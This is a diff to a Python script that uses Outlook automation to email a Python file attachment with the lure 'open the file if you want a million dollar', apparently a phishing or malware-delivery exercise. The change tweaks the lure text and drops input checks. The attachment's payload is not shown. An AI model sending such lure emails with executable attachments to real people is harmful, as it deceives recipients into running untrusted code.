@@ -11,7 +11,7 @@ def send_mail():
 	mail = outlook.CreateItem(0)
 	mail.To = email
 	mail.Subject = job_title
-	mail.Body = body+'open the file if you want a million dollar'
+	mail.Body = body+'\nopen the file if you want a million dollar'
 	attachment  = "attachment.py"
 	path=os.getcwd() + '\\' + attachment
 	mail.Attachments.Add(path)
@@ -49,23 +49,13 @@ if len(sys.argv)==5:
 		
 	elif "title" in benignMail or "Title" in benignMail:	#its a string
 		str=benignMail.split("\n")
-		name = ""
-		title = ""
 		for line in str:
 			if "name" in line :
-				name=line.split(":")[1]
+				email=line.split(":")[1]
 			elif "title" in line or "Title" in line:
-				title=line.split(":")[1]
+				job_title=line.split(":")[1]
 			elif "body" in line or "content" :
 				body = line.split(":")[1]+"\n"
-		if not name :
-			print ("no name")
-			sys.exit()
-		if not title :
-			print ("no title")
-			sys.exit()
-		email=name
-		job_title=title
 		send_mail()
 	elif os.path.exists(benignMail):		#its a path
 		with open(benignMail) as p:
@@ -75,19 +65,11 @@ if len(sys.argv)==5:
 		body = ""
 		for line in a:
 			if "name" in line :
-				name=line.split(":")[1].strip()
+				email=line.split(":")[1].strip()
 			elif "title" in line or "Title" in line:
-				title=line.split(":")[1].strip()
+				job_title=line.split(":")[1].strip()
 			elif "body" in line or "content" :
 				body = line.split(":")[1].strip()+"\n"
-		if not name :
-			print ("no name")
-			sys.exit()
-		if not title :
-			print ("no title")
-			sys.exit()
-		email=name
-		job_title=title
 		send_mail()
 	else:
 		print ("not valid benignMail")
